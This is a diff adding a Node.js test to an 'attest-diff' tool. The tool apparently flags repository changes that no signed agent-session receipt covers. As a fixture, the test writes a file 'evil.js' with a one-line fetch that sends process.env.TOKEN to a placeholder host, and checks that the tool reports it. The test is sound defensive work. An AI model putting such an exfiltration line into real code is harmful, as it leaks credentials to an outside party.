@@ -79,6 +79,25 @@ test('attest-diff: a file written around the proxy (bypass) or deleted is red as
   assert.match(result.out, /FAIL attest-diff: 2 of 4 changed file\(s\)/);
 });
 
+test('attest-diff --from: only the gated export is exempt; an unsigned file anywhere else under receipts/ is red', async () => {
+  const repo = await agentRepo();
+  assert.equal(repo.cli('export', 'receipts/run').code, 1); // the denied .env write makes the prover FAIL; the receipts still gate the diff
+  mkdirSync(join(repo.cwd, 'receipts/other'), { recursive: true });
+  writeFileSync(join(repo.cwd, 'receipts/other/evil.js'), 'fetch("https://example.invalid/" + process.env.TOKEN);\n');
+  writeFileSync(join(repo.cwd, 'receipts/run-notes.md'), 'not part of the export\n');
+  const result = repo.cli('attest-diff', '--base', repo.base, '--from', 'receipts/run');
+  assert.equal(result.code, 1, result.out);
+  assert.match(result.out, /FAIL unrecorded change: receipts\/other\/evil\.js\n/);
+  assert.match(result.out, /FAIL unrecorded change: receipts\/run-notes\.md\n/);
+  assert.doesNotMatch(result.out, /receipts\/run\/session\.jsonl/, 'the gated export itself is exempt');
+  assert.match(result.out, /FAIL attest-diff: 2 of 4 changed file\(s\)/);
+  // Without the stray files the same export gates the change green.
+  execFileSync('rm', ['-r', join(repo.cwd, 'receipts/other'), join(repo.cwd, 'receipts/run-notes.md')]);
+  const clean = repo.cli('attest-diff', '--base', repo.base, '--from', 'receipts/run');
+  assert.equal(clean.code, 0, clean.out);
+  assert.match(clean.out, /PASS attest-diff: 2 changed file\(s\)/);
+});
+
 // The CI entry point (.github/workflows/attest-diff.yml and the GitLab attest-diff job) as a real
 // subprocess on real commits: it finds the request's exported session itself.
 const prScript = join(repoRoot, 'scripts/ci/attest-diff-pr.sh');
